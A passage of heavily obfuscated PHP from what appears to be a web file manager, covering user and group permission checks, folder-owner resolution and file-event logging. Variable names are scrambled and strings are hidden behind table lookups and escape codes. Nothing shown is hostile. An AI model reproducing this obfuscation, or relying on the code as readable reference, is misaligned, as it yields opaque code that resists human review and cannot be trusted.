|| $şãŒ—ğò == $™¡½ãÚš) { continue; } $ÌÁ–Á = $this->groupRootAuth($şãŒ—ğò, $à×¬Œ€è); if (!$ÌÁ–Á) { continue; } $¤¯œçÍÄ = $this->groupAuthInfo($ÌÁ–Á, $şãŒ—ğò); break; } } if (!$¤¯œçÍÄ || $¤¯œçÍÄ[$ƒ¼ìµ¥¼[452]] <= 0) { $Ö²€…™æ = $this->authDeepCheck($¶‹á®Ú®[$ƒ¼ìµ¥¼[440]], $à×¬Œ€è); if ($Ö²€…™æ) { $¤¯œçÍÄ = $Ö²€…™æ; } } return $¤¯œçÍÄ; } private function userIsRoot($ÖÎÜöÔ = false) { $¸î˜é¡¯ =& $_SERVER[¡“ËÌ§œ]; if (!$ÖÎÜöÔ && _get($GLOBALS, $¸î˜é¡¯[532])) { return !0; } $ö›Ñıúè = Model($¸î˜é¡¯[563])->getInfo($ÖÎÜöÔ); $í½Íë˜Ğ = Model($¸î˜é¡¯[2052])->listData($ö›Ñıúè[$¸î˜é¡¯[1540]]); if ($í½Íë˜Ğ && $í½Íë˜Ğ[$¸î˜é¡¯[540]][$¸î˜é¡¯[2053]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¡÷ÈÌœ) { $Åº¨®ğ¸ =& $_SERVER[¡“ËÌ§œ]; $–œ«‹«Ä = Model($Åº¨®ğ¸[1353]); $’ºúÄ´¼ = $–œ«‹«Ä->sourceInfo($¡÷ÈÌœ); if (!$’ºúÄ´¼) { return !1; } $–œ«‹«Ä->groupPathDisplay($’ºúÄ´¼); $ã³Â®ÌŠ = array($’ºúÄ´¼); $ã³Â®ÌŠ = $–œ«‹«Ä->_listAppendPath($ã³Â®ÌŠ); $’ºúÄ´¼ = $ã³Â®ÌŠ[0]; $¯ÈÉÏ•‚ = $’ºúÄ´¼[$Åº¨®ğ¸[547]]; if (isset($’ºúÄ´¼[$Åº¨®ğ¸[555]])) { $Æ¸Ëà„Ë = explode($Åº¨®ğ¸[8], trim($’ºúÄ´¼[$Åº¨®ğ¸[547]], $Åº¨®ğ¸[8])); array_shift($Æ¸Ëà„Ë); $¯ÈÉÏ•‚ = $’ºúÄ´¼[$Åº¨®ğ¸[553]] . $Åº¨®ğ¸[2054] . implode($Åº¨®ğ¸[8], $Æ¸Ëà„Ë); } return array($Åº¨®ğ¸[458] => $’ºúÄ´¼[$Åº¨®ğ¸[32]], $Åº¨®ğ¸[84] => KodIO::make($’ºúÄ´¼[$Åº¨®ğ¸[440]]), $Åº¨®ğ¸[2055] => $¯ÈÉÏ•‚); } private function groupAuthInfo($¾¤¶›õ, $ ˆ…éà¥) { $½­¯£Ãå =& $_SERVER[¡“ËÌ§œ]; $›µ Ñ”Ó = Model($½­¯£Ãå[550])->getInfo($ ˆ…éà¥); return array($½­¯£Ãå[2056] => intval($¾¤¶›õ[$½­¯£Ãå[451]]), $½­¯£Ãå[2040] => $¾¤¶›õ, $½­¯£Ãå[2057] => LNG($½­¯£Ãå[2058]), $½­¯£Ãå[2049] => array($½­¯£Ãå[458] => $›µ Ñ”Ó[$½­¯£Ãå[32]], $½­¯£Ãå[84] => KodIO::make($›µ Ñ”Ó[$½­¯£Ãå[87]][$½­¯£Ãå[440]]), $½­¯£Ãå[2055] => $›µ Ñ”Ó[$½­¯£Ãå[554]])); } protected function groupRootAuth($˜ƒí°Û, $œóâ¬ = false) { $³•Úµè´ =& $_SERVER[¡“ËÌ§œ]; $œóâ¬ = $œóâ¬ ? $œóâ¬ : USER_ID; $¯‚ÂªÖ« = $œóâ¬ . $³•Úµè´[2059] . $˜ƒí°Û; static $Ò‚„›Æ· = array(); if (isset($Ò‚„›Æ·[$¯‚ÂªÖ«])) { return $Ò‚„›Æ·[$¯‚ÂªÖ«]; } $«Ğ¨Ö÷Ü = Model($³•Úµè´[550])->getInfo($˜ƒí°Û); $ áÌı– = $this->userGroupList($œóâ¬); $¡ú²¯™ = isset($ áÌı–[$˜ƒí°Û]) ? $ áÌı–[$˜ƒí°Û][$³•Úµè´[451]] : !1; if ($¡ú²¯™ && Model($³•Úµè´[536])->authCheckAction($¡ú²¯™[$³•Úµè´[451]], $³•Úµè´[1872])) { $Ò‚„›Æ·[$¯‚ÂªÖ«] = $¡ú²¯™; return $¡ú²¯™; } $ˆÔÌş = $this->sourceAuthSelect($«Ğ¨Ö÷Ü[$³•Úµè´[87]][$³•Úµè´[440]]); $ñ†§šÇ¬ = $ˆÔÌş ? $this->authMake($ˆÔÌş, $œóâ¬) : !1; $»¿§†¸´ = $ñ†§šÇ¬ ? $ñ†§šÇ¬[$³•Úµè´[505]] : !1; $Ò‚„›Æ·[$¯‚ÂªÖ«] = $»¿§†¸´ ? $»¿§†¸´ : $¡ú²¯™; return $Ò‚„›Æ·[$¯‚ÂªÖ«]; } public function authOwnerApply($Ãã¯£¬Æ) { $ğÉ¹«Õî =& $_SERVER[¡“ËÌ§œ]; if (empty($Ãã¯£¬Æ[$ğÉ¹«Õî[451]]) || isset($Ãã¯£¬Æ[$ğÉ¹«Õî[2060]]) && $Ãã¯£¬Æ[$ğÉ¹«Õî[2060]]) { return $Ãã¯£¬Æ; } if (AuthModel::authCheckRoot($Ãã¯£¬Æ[$ğÉ¹«Õî[451]][$ğÉ¹«Õî[452]])) { return $Ãã¯£¬Æ; } $Ã²ôŸä‡ = Model($ğÉ¹«Õî[1353])->parentLevelArray($Ãã¯£¬Æ[$ğÉ¹«Õî[549]]); $Ã²ôŸä‡ = array_merge(array($Ãã¯£¬Æ[$ğÉ¹«Õî[440]]), array_reverse($Ã²ôŸä‡)); $ˆşüâƒ‘ = $this->sourceAuthSelect($Ã²ôŸä‡); $©™ÚÏø = array(); $†÷‡‰ÁÁ = array(); foreach ($ˆşüâƒ‘ as $Çâ–Ùñ => $ù¶ ÂÆ¯) { $×œ­¼Ü = $this->authFolderOwnerUser($ù¶ ÂÆ¯); $©™ÚÏø[$Çâ–Ùñ] = $×œ­¼Ü; $†÷‡‰ÁÁ = array_merge($†÷‡‰ÁÁ, $×œ­¼Ü[$ğÉ¹«Õî[628]]); if ($×œ­¼Ü[$ğÉ¹«Õî[2061]]) { break; } } if (count($†÷‡‰ÁÁ) == 0) { $†÷‡‰ÁÁ = $this->authFolderOwnerGroup($Ãã¯£¬Æ[$ğÉ¹«Õî[534]]); } $†÷‡‰ÁÁ = array_unique($†÷‡‰ÁÁ); if (AuthModel::authCheckRoot($Ãã¯£¬Æ[$ğÉ¹«Õî[451]][$ğÉ¹«Õî[452]])) { $†÷‡‰ÁÁ[] = USER_ID; } $Ãã¯£¬Æ[$ğÉ¹«Õî[451]][$ğÉ¹«Õî[2062]] = Model($ğÉ¹«Õî[542])->userListInfo($†÷‡‰ÁÁ); return $Ãã¯£¬Æ; } private function authFolderOwnerGroup($ãÁ¯µĞ) { $ÛÒæ¿¡á =& $_SERVER[¡“ËÌ§œ]; $È‰ ‚– = Model($ÛÒæ¿¡á[1941])->where(array($ÛÒæ¿¡á[1851] => $ãÁ¯µĞ))->select(); $Œ¾€Áß = array(); if (!$È‰ ‚–) { return $Œ¾€Áß; } foreach ($È‰ ‚– as $„ÛßİÇ») { $ü…Ôš»„ = $this->authInfo($„ÛßİÇ»); if (AuthModel::authCheckRoot($ü…Ôš»„[$ÛÒæ¿¡á[451]])) { $Œ¾€Áß[] = $„ÛßİÇ»[$ÛÒæ¿¡á[1661]]; } } return $Œ¾€Áß; } private function authFolderOwnerUser($’„†ÖÜĞ) { $àôëá€Ô =& $_SERVER[¡“ËÌ§œ]; $”¹¼Şº = array(); $œ™õ¬³± = !1; foreach ($’„†ÖÜĞ as $Ñ£±Œóå) { $ÌêØ—…„ = $this->authInfo($Ñ£±Œóå); if ($Ñ£±Œóå[$àôëá€Ô[534]] == $àôëá€Ô[198]) { $œ™õ¬³± = !0; } if ($Ñ£±Œóå[$àôëá€Ô[449]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÌêØ—…„[$àôëá€Ô[451]])) { $”¹¼Şº[] = $Ñ£±Œóå[$àôëá€Ô[534]]; } } } return array($àôëá€Ô[628] => $”¹¼Şº, $àôëá€Ô[2061] => $œ™õ¬³±); } public function authMake($Ğ¹×ßƒÎ, $È§÷ØÛ = false) { $¥ŸÎŠÛå =& $_SERVER[¡“ËÌ§œ]; $½ÜÏ›”è = $this->authArrayCheck($Ğ¹×ßƒÎ, $È§÷ØÛ); if ($½ÜÏ›”è[$¥ŸÎŠÛå[2063]]) { $½ÜÏ›”è[$¥ŸÎŠÛå[2063]] = $this->sourceAuthInfo($½ÜÏ›”è[$¥ŸÎŠÛå[2063]]); } return $½ÜÏ›”è; } public function authArrayCheck($Ÿ˜ ÷–, $äâİ›ö‹ = false) { $Ó‘‘‚£Ç =& $_SERVER[¡“ËÌ§œ]; if (!$Ÿ˜ ÷–) { return array($Ó‘‘‚£Ç[452] => 0, $Ó‘‘‚£Ç[505] => !1); } $äâİ›ö‹ = $äâİ›ö‹ ? $äâİ›ö‹ : USER_ID; $í±Ú¢‚ª = 0; $ÇùÌ¾°ê = 0; $î§Ëõ¯ = 0; $œ©˜æ…å = 0; $¡ŞŠ¡ñ = 0; $â’¹áÈ¯ = 0; $½öòÓŒ = 1000; $Ç“£ªå = 0; $ª¨øÉÕá = 0; $·‚Ğˆø¹ = 0; $ÅÄìÓª± = 0; $ÇĞùíåÄ = array($Ó‘‘‚£Ç[440] => 0); foreach ($Ÿ˜ ÷– as $ÇĞùíåÄ) { $²úŠÆêô = $this->authInfo($ÇĞùíåÄ); if (!$²úŠÆêô) { continue; } $Á¿şéÁœ = $ÇĞùíåÄ[$Ó‘‘‚£Ç[534]]; $¦ş†Üª = intval($²úŠÆêô[$Ó‘‘‚£Ç[451]]); if ($ÇĞùíåÄ[$Ó‘‘‚£Ç[449]] == SourceModel::TYPE_USER && $Á¿şéÁœ == $äâİ›ö‹) { $í±Ú¢‚ª = !0; $î§Ëõ¯ = $²úŠÆêô; $ÇùÌ¾°ê = $¦ş†Üª; } else { if ($ÇĞùíåÄ[$Ó‘‘‚£Ç[449]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Á¿şéÁœ, $äâİ›ö‹)) { $œ©˜æ…å = !0; $Õº¹ø“ = $this->groupStepToUserGroup($Á¿şéÁœ, $äâİ›ö‹); if ($Õº¹ø“ < $½öòÓŒ) { $½öòÓŒ = $Õº¹ø“; $¡ŞŠ¡ñ = $¦ş†Üª; $â’¹áÈ¯ = $²úŠÆêô; $Ç“£ªå = $Á¿şéÁœ; } if ($Õº¹ø“ == $½öòÓŒ && $¦ş†Üª >= $¡ŞŠ¡ñ) { $¡ŞŠ¡ñ = $¦ş†Üª; $â’¹áÈ¯ = $²úŠÆêô; $Ç“£ªå = $Á¿şéÁœ; } } else { if ($Á¿şéÁœ == $Ó‘‘‚£Ç[198]) { $ª¨øÉÕá = !0; $ÅÄìÓª± = $²úŠÆêô; $·‚Ğˆø¹ = $¦ş†Üª; } } } } if ($í±Ú¢‚ª) { $Ÿ¡ëâüî = $ÇùÌ¾°ê; $²úŠÆêô = $î§Ëõ¯; $¢¨ç’ ‚ = LNG($Ó‘‘‚£Ç[2064]); } else { if ($œ©˜æ…å) { $Ÿ¡ëâüî = $¡ŞŠ¡ñ; $²úŠÆêô = $â’¹áÈ¯; $’çõã•ú = Model($Ó‘‘‚£Ç[550])->getInfo($Ç“£ªå); $¢¨ç’ ‚ = $Ó‘‘‚£Ç[162] . $’çõã•ú[$Ó‘‘‚£Ç[554]] . $Ó‘‘‚£Ç[2065] . LNG($Ó‘‘‚£Ç[2066]); } else { if ($ª¨øÉÕá) { $Ÿ¡ëâüî = $·‚Ğˆø¹; $²úŠÆêô = $ÅÄìÓª±; $¢¨ç’ ‚ = LNG($Ó‘‘‚£Ç[2037]); } else { $Ÿ¡ëâüî = 0; $²úŠÆêô = !1; $¢¨ç’ ‚ = $Ó‘‘‚£Ç[12]; } } } $ÒÛ Æ÷¶ = array($Ó‘‘‚£Ç[2056] => intval($Ÿ¡ëâüî), $Ó‘‘‚£Ç[2040] => $²úŠÆêô, $Ó‘‘‚£Ç[2057] => $¢¨ç’ ‚, $Ó‘‘‚£Ç[2049] => $ÇĞùíåÄ[$Ó‘‘‚£Ç[440]]); return $ÒÛ Æ÷¶; } private function groupContainUser($Ù•×ÖØ, $å…·¤«“ = false) { return in_array($Ù•×ÖØ, $this->userGroupParents($å…·¤«“)); } private function groupStepToUserGroup($“’˜¯üü, $ù¯¸ÁøÍ = false) { $Ùóô±Ò‰ =& $_SERVER[¡“ËÌ§œ]; $»†šñö = $this->userGroupList($ù¯¸ÁøÍ); $‰™ì¢ = 1000; $Ò¼õêÏó = $GLOBALS[$Ùóô±Ò‰[6]][$Ùóô±Ò‰[89]][$Ùóô±Ò‰[1954]] == 1; $±»˜óê¡ = $Ò¼õêÏó ? 3 : 2; foreach ($»†šñö as $ôÜÒ‹ì) { if ($ôÜÒ‹ì[$Ùóô±Ò‰[1851]] == $“’˜¯üü) { return 0; } $©¼­İüŒ = explode($Ùóô±Ò‰[50], trim($ôÜÒ‹ì[$Ùóô±Ò‰[549]], $Ùóô±Ò‰[50])); if ($©¼­İüŒ[0] == $Ùóô±Ò‰[198] && count($©¼­İüŒ) > $±»˜óê¡) { $Ÿù˜“Âü = array_reverse(array_slice($©¼­İüŒ, $±»˜óê¡)); $ö·şÈé = array_search($“’˜¯üü, $Ÿù˜“Âü); if ($ö·şÈé !== !1 && $ö·şÈé + 1 <= $‰™ì¢) { $‰™ì¢ = $ö·şÈé + 1; } } } return $‰™ì¢; } private function userGroupList($Œ‘ûÀ¯ = false) { $Å¤Ò¢ƒ =& $_SERVER[¡“ËÌ§œ]; static $€Ô„†Õ = array(); if (isset($€Ô„†Õ[$Œ‘ûÀ¯])) { return $€Ô„†Õ[$Œ‘ûÀ¯]; } $ÅåÄüÅ˜ = Model($Å¤Ò¢ƒ[563])->getInfo($Œ‘ûÀ¯); $€Ô„†Õ[$Œ‘ûÀ¯] = array_to_keyvalue($ÅåÄüÅ˜[$Å¤Ò¢ƒ[2038]], $Å¤Ò¢ƒ[1851]); return $€Ô„†Õ[$Œ‘ûÀ¯]; } public function userGroupParents($İº‰ú¨) { $ÙœàÚÜ =& $_SERVER[¡“ËÌ§œ]; static $õÈ­­‚ = array(); $İº‰ú¨ = $İº‰ú¨ ? $İº‰ú¨ : USER_ID; if (isset($õÈ­­‚[$İº‰ú¨])) { return $õÈ­­‚[$İº‰ú¨]; } $¸éì­í¦ = $this->userGroupList($İº‰ú¨); $ßÇ¿Ç¹¸ = array(); $¥«¹•÷’ = $GLOBALS[$ÙœàÚÜ[6]][$ÙœàÚÜ[89]][$ÙœàÚÜ[1954]] == 1; $Ôı’·Çº = $¥«¹•÷’ ? 3 : 2; foreach ($¸éì­í¦ as $ìŒê’¡) { $™‡œÏˆå = array($ìŒê’¡[$ÙœàÚÜ[1851]]); $İäÂáÚ = explode($ÙœàÚÜ[50], trim($ìŒê’¡[$ÙœàÚÜ[549]], $ÙœàÚÜ[50])); if ($İäÂáÚ[0] == $ÙœàÚÜ[198] && count($İäÂáÚ) > $Ôı’·Çº) { $‹º°Üµ¾ = array_slice($İäÂáÚ, $Ôı’·Çº); $™‡œÏˆå = array_merge($™‡œÏˆå, array_reverse($‹º°Üµ¾)); } $ßÇ¿Ç¹¸ = array_merge($ßÇ¿Ç¹¸, $™‡œÏˆå); } $õÈ­­‚[$İº‰ú¨] = array_unique($ßÇ¿Ç¹¸); return $õÈ­­‚[$İº‰ú¨]; } public function authTargetInfoMake($™ô˜Ò˜) { $ì„ñ‹ù¶ =& $_SERVER[¡“ËÌ§œ]; $¨¯ÉÕ = array(); $‰šÊÑò¡ = array(); foreach ($™ô˜Ò˜ as $×‘²“ ) { if ($×‘²“ [$ì„ñ‹ù¶[449]] == SourceModel::TYPE_USER) { $¨¯ÉÕ[] = intval($×‘²“ [$ì„ñ‹ù¶[534]]); } else { if ($×‘²“ [$ì„ñ‹ù¶[449]] == SourceModel::TYPE_GROUP) { $‰šÊÑò¡[] = intval($×‘²“ [$ì„ñ‹ù¶[534]]); } } } if ($¨¯ÉÕ) { $¨¯ÉÕ = Model($ì„ñ‹ù¶[542])->userListInfo($¨¯ÉÕ); } if ($‰šÊÑò¡) { $ˆÒ‡ñú = array($ì„ñ‹ù¶[1939] => array($ì„ñ‹ù¶[456], $‰šÊÑò¡)); $‰šÊÑò¡ = Model($ì„ñ‹ù¶[550])->field($ì„ñ‹ù¶[2067])->where($ˆÒ‡ñú)->select(); $‰šÊÑò¡ = array_to_keyvalue($‰šÊÑò¡, $ì„ñ‹ù¶[1851]); } return array($ì„ñ‹ù¶[2068] => $¨¯ÉÕ, $ì„ñ‹ù¶[2069] => $‰šÊÑò¡); } public function authInfo($Ãª…İÀ·) { $¨Í­óÇ =& $_SERVER[¡“ËÌ§œ]; if ($Ãª…İÀ·[$¨Í­óÇ[1955]]) { $¢›Î¡è = Model($¨Í­óÇ[536])->listData($Ãª…İÀ·[$¨Í­óÇ[1955]]); if (!$¢›Î¡è) { return !1; $× Â”É = Model($¨Í­óÇ[536])->listData(); $‘»ßÙÂñ = array_filter_by_field($× Â”É, $¨Í­óÇ[451], $¨Í­óÇ[198]); return $‘»ßÙÂñ; } $”ã±Áõğ = array_field_key($¢›Î¡è, array($¨Í­óÇ[437], $¨Í­óÇ[32], $¨Í­óÇ[451], $¨Í­óÇ[1874], $¨Í­óÇ[1875])); $”ã±Áõğ[$¨Í­óÇ[2070]] = $Ãª…İÀ·; return $”ã±Áõğ; } else { return array($¨Í­óÇ[457] => 0, $¨Í­óÇ[1857] => $Ãª…İÀ·[$¨Í­óÇ[2015]], $¨Í­óÇ[458] => $¨Í­óÇ[12], $¨Í­óÇ[1874] => $¨Í­óÇ[2071]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\145\137\x65\166\145\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\155\145", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\144\x65\x73\143", '', "\151\x6e\163\145\x72\x74\54\165\160\x64\141\x74\x65\x2c\x73\145\x6c\x65\x63\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($öŞ“¼¬™, $õÅŠãù¥, $ìàŒ¦¬ú = '') { $¯¬÷­¹ =& $_SERVER[¡“ËÌ§œ]; if (!$this->eventSave) { return; } $ÎıÌºŒ“ = Model($¯¬÷­¹[1353])->sourceInfo($öŞ“¼¬™); if (!$ÎıÌºŒ“) { return !1; } if ($this->isCacheEvent($ÎıÌºŒ“, $õÅŠãù¥)) { return; } if ($ìàŒ¦¬ú && is_string($ìàŒ¦¬ú)) { $ìàŒ¦¬ú = array($¯¬÷­¹[1890] => $ìàŒ¦¬ú); } $úø›­Ç‘ = defined($¯¬÷­¹[2072]) ? USER_ID : 0; $óÙ™ØÃÀ = array($¯¬÷­¹[455] => $öŞ“¼¬™, $¯¬÷­¹[2073] => $ÎıÌºŒ“[$¯¬÷­¹[470]], $¯¬÷­¹[2074] => $ÎıÌºŒ“[$¯¬÷­¹[32]], $¯¬÷­¹[547] => !empty($ÎıÌºŒ“[$¯¬÷­¹[547]]) ? $ÎıÌºŒ“[$¯¬÷­¹[547]] : $¯¬÷­¹[12], $¯¬÷­¹[1652] => $úø›­Ç‘, $¯¬÷­¹[460] => $õÅŠãù¥, $¯¬÷­¹[1654] => $ìàŒ¦¬ú); $this->addSystemLog($õÅŠãù¥, $óÙ™ØÃÀ); unset($óÙ™ØÃÀ[$¯¬÷­¹[2074]], $óÙ™ØÃÀ[$¯¬÷­¹[547]]); return $this->add($óÙ™ØÃÀ); } private function addSystemLog($å¶§·—, $òÅ±šš) { $ãÍÛ–Šâ =& $_SERVER[¡“ËÌ§œ]; if ($å¶§·— == $ãÍÛ–Šâ[2075]) { $å¶§·— = $òÅ±šš[$ãÍÛ–Šâ[491]][$ãÍÛ–Šâ[2076]]; } else { if (in_array($å¶§·—, array($ãÍÛ–Šâ[1831], $ãÍÛ–Šâ[2077]))) { $å¶§·— = $òÅ±šš[$ãÍÛ–Šâ[491]][$ãÍÛ–Šâ[774]]; } } $Å¤ÃíåË = array_merge($òÅ±šš, array($ãÍÛ–Šâ[2078] => $òÅ±šš[$ãÍÛ–Šâ[440]], $ãÍÛ–Šâ[2079] => $òÅ±šš[$ãÍÛ–Šâ[2079]])); Hook::trigger($ãÍÛ–Šâ[2080], $ãÍÛ–Šâ[2081] . $å¶§·—, $òÅ±šš); Model($ãÍÛ–Šâ[1795])->addLog($ãÍÛ–Šâ[2081] . $å¶§·—, $Å¤ÃíåË); } private function isCacheEvent($à¶¥ıŠ, $Ÿ»Ù†À) { if ($à¶¥ıŠ[$_SERVER[¡“ËÌ§œ][449]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Ü­ßï•ë, $àŒà¼¤) { $ºíÜŸÌÓ =& $_SERVER[¡“ËÌ§œ]; $üô†²¸ = Model($ºíÜŸÌÓ[1353])->sourceInfo($Ü­ßï•ë); $…“­¾ƒ” = array($ºíÜŸÌÓ[2076] => $àŒà¼¤, $ºíÜŸÌÓ[32] => $üô†²¸[$ºíÜŸÌÓ[32]]); return $this->addEvent($Ü­ßï•ë, $ºíÜŸÌÓ[2075], $…“­¾ƒ”); } public function eventFileEdit($ñ“Í÷Ç¼) { $£–µ¢İ• =& $_SERVER[¡“ËÌ§œ]; $‰ä¥¿± = array($£–µ¢İ•[2082] => $_SERVER[$£–µ¢İ•[2083]], $£–µ¢İ•[2084] => strtolower(ACTION)); if (isset($GLOBALS[$£–µ¢İ•[7]][$£–µ¢İ•[2085]])) { $‰ä¥¿±[$£–µ¢İ•[2085]] = $£–µ¢İ•[88]; } return $this->addEvent($ñ“Í÷Ç¼, $£–µ¢İ•[1821], $‰ä¥¿±); } public function eventRecycle($¼¶Çç¨¬, $Ú“Õ¼±«) { return $this->addEvent($¼¶Çç¨¬, $_SERVER[¡“ËÌ§œ][2077], $Ú“Õ¼±«); } public function eventRemove($›Ç¿«¦“) { $…Ê­í¥£ =& $_SERVER[¡“ËÌ§œ]; $ê‘ÅĞ = Model($…Ê­í¥£[1353])->sourceInfo($›Ç¿«¦“); $¶åï± æ = $ê‘ÅĞ[$…Ê­í¥£[32]]; return $this->addEvent($ê‘ÅĞ[$…Ê­í¥£[470]], $…Ê­í¥£[1820], $¶åï± æ); } public function eventShare($ş£œøüØ, $·¤öø®¡) { return $this->addEvent($ş£œøüØ, $_SERVER[¡“ËÌ§œ][1831], $·¤öø®¡); } public function eventMove($Ö¶”ÉÀ‡, $Ü—›ü™Ô, $˜ã¯€’€) { $ÎÉˆ’Ÿ =& $_SERVER[¡“ËÌ§œ]; $ŒáÂÚ®ä = Model($ÎÉˆ’Ÿ[1353]); $ÙÈÌµÌæ = $ŒáÂÚ®ä->sourceInfo($Ö¶”ÉÀ‡); $Ëáİ¿Í = $ŒáÂÚ®ä->sourceInfo($Ü—›ü™Ô); $Ú½™¬Îù = $ŒáÂÚ®ä->sourceInfo($˜ã¯€’€); $ÔïÓÍû¯ = array($ÎÉˆ’Ÿ[1180] => $Ü—›ü™Ô, $ÎÉˆ’Ÿ[2086] => $Ëáİ¿Í[$ÎÉˆ’Ÿ[32]], $ÎÉˆ’Ÿ[2063] => !empty($Ëáİ¿Í[$ÎÉˆ’Ÿ[547]]) ? $Ëáİ¿Í[$ÎÉˆ’Ÿ[547]] : $ÎÉˆ’Ÿ[12], $ÎÉˆ’Ÿ[1181] => $˜ã¯€’€, $ÎÉˆ’Ÿ[2087] => $Ú½™¬Îù[$ÎÉˆ’Ÿ[32]], $ÎÉˆ’Ÿ[2088] => !empty($Ú½™¬Îù[$ÎÉˆ’Ÿ[547]]) ? $Ú½™¬Îù[$ÎÉˆ’Ÿ[547]] : $ÎÉˆ’Ÿ[12]); $this->addEvent($Ö¶”ÉÀ‡, $ÎÉˆ’Ÿ[586], $ÔïÓÍû¯); $ÙÈÌµÌæ = $ŒáÂÚ®ä->sourceInfo($Ö¶”ÉÀ‡); $ÔïÓÍû¯ = array($ÎÉˆ’Ÿ[440] => $ÙÈÌµÌæ[$ÎÉˆ’Ÿ[440]], $ÎÉˆ’Ÿ[32] => $ÙÈÌµÌæ[$ÎÉˆ’Ÿ[32]]); $this->addEvent($Ü—›ü™Ô, $ÎÉˆ’Ÿ[2089], $ÔïÓÍû¯); } public function eventCopy($ˆŠÚÌ§¤) { $this->eventCreate($ˆŠÚÌ§¤, $_SERVER[¡“ËÌ§œ][584]); } public function eventRename($Œè†¢ƒÛ, $ÍïÛŒ­â, $ÆÂºßÉ) { $½è–±¶¶ =& $_SERVER[¡“ËÌ§œ]; $íÖÉ¦µà = array($½è–±¶¶[1180] => $ÍïÛŒ­â, $½è–±¶¶[1181] => $ÆÂºßÉ); return $this->addEvent($Œè†¢ƒÛ, $½è–±¶¶[1368], $íÖÉ¦µà); } public function eventAddComment($›ïØß, $íƒ´„) { return $this->addEvent($›ïØß, $_SERVER[¡“ËÌ§œ][2090], $íƒ´„); } public function eventAddDesc($àÍèÁßÄ, $É¥®’¦©) { return $this->addEvent($àÍèÁßÄ, $_SERVER[¡“ËÌ§œ][2091], $É¥®’¦©); } public function listBySource($‡ßñÇô) { $Îé·Í =& $_SERVER[¡“ËÌ§œ]; $î³¤¹÷ë = Model($Îé·Í[1353])->sourceInfo($‡ßñÇô); $êõ÷œ• = array($Îé·Í[455] => $‡ßñÇô); if ($î³¤¹÷ë[$Îé·Í[448]] == $Îé·Í[88]) { $è¤Éœ‡ = Model($Îé·Í[1353])->listSearchChildren($‡ßñÇô, 20000); $è¤Éœ‡[] = $‡ßñÇô . $Îé·Í[407]; $êõ÷œ• = array($Îé·Í[440] => array($Îé·Í[7], $è¤Éœ‡)); } $§«ê‹œ× = $this->where($êõ÷œ•)->order($Îé·Í[2092])->selectPage(); if ($§«ê‹œ×[$Îé·Í[395]][$Îé·Í[396]] == 0) { $§«ê‹œ×[$Îé·Í[395]][$Îé·Í[396]] = 1; $§«ê‹œ×[$Îé·Í[398]] = array(array($Îé·Í[455] => $‡ßñÇô, $Îé·Í[2073] => $î³¤¹÷ë[$Îé·Í[470]], $Îé·Í[1652] => $î³¤¹÷ë[$Îé·Í[492]], $Îé·Í[460] => $Îé·Í[2093], $Îé·Í[461] => $î³¤¹÷ë[$Îé·Í[201]], $Îé·Í[1654] => $Îé·Í[12])); } return $this->eventListParse($§«ê‹œ×, $‡ßñÇô); } private function eventListParse($åºÂîãî, $¿¹•åƒû) { $èŒŞïğ =& $_SERVER[¡“ËÌ§œ]; $ƒÓ…„¥İ = $åºÂîãî[$èŒŞïğ[398]]; $ôœóÍ…à = array_to_keyvalue($ƒÓ…„¥İ, $èŒŞïğ[12], $èŒŞïğ[440]); $òİºóè‹ = array_to_keyvalue($ƒÓ…„¥İ, $èŒŞïğ[12], $èŒŞïğ[2079]); foreach ($ƒÓ…„¥İ as $³¢¯‡×Ò) { $ÕŒŸ£ú = $³¢¯‡×Ò[$èŒŞïğ[491]]; if ($³¢¯‡×Ò[$èŒŞïğ[33]] == $èŒŞïğ[586] && isset($ÕŒŸ£ú[$èŒŞïğ[1180]])) { $ôœóÍ…à[] = $ÕŒŸ£ú[$èŒŞïğ[1180]] . $èŒŞïğ[12]; $ôœóÍ…à[] = $ÕŒŸ£ú[$èŒŞïğ[1181]] . $èŒŞïğ[12]; } if ($³¢¯‡×Ò[$èŒŞïğ[33]] == $èŒŞïğ[2089] && isset($ÕŒŸ£ú[$èŒŞïğ[440]])) { $ôœóÍ…à[] = $ÕŒŸ£ú[$èŒŞïğ[440]] . $èŒŞïğ[12]; } } $ôœóÍ…à = array_merge($ôœóÍ…à, $òİºóè‹, array($¿¹•åƒû . $èŒŞïğ[12])); $ôœóÍ…à = array_unique($ôœóÍ…à); $‹¥Ÿğú½ = array_unique(array_to_keyvalue($ƒÓ…„¥İ, $èŒŞïğ[12], $èŒŞïğ[1661])); $Õ±şë´˜ = Model($èŒŞïğ[563])->userListInfo($‹¥Ÿğú½); $’ĞÙÈÂ = Model($èŒŞïğ[845])->sourceListInfo($ôœóÍ…à, !0); foreach ($ƒÓ…„¥İ as &$³¢¯‡×Ò) { if ($³¢¯‡×Ò[$èŒŞïğ[33]] == $èŒŞïğ[586] && isset($³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[1180]])) { $³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[1180]] = $’ĞÙÈÂ[$³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[1180]]]; $³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[1181]] = $’ĞÙÈÂ[$³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[1181]]]; } if ($³¢¯‡×Ò[$èŒŞïğ[33]] == $èŒŞïğ[2089] && isset($³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[440]])) { $³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[440]] = $’ĞÙÈÂ[$³¢¯‡×Ò[$èŒŞïğ[491]][$èŒŞïğ[440]]]; } $³¢¯‡×Ò[$èŒŞïğ[87]] = $’ĞÙÈÂ[$³¢¯‡×Ò[$èŒŞïğ[440]]]; $³¢¯‡×Ò[$èŒŞïğ[2094]] = $’ĞÙÈÂ[$³¢¯‡×Ò[$èŒŞïğ[2079]]]; if ($³¢¯‡×Ò[$èŒŞïğ[33]] == $èŒŞïğ[1820]) { 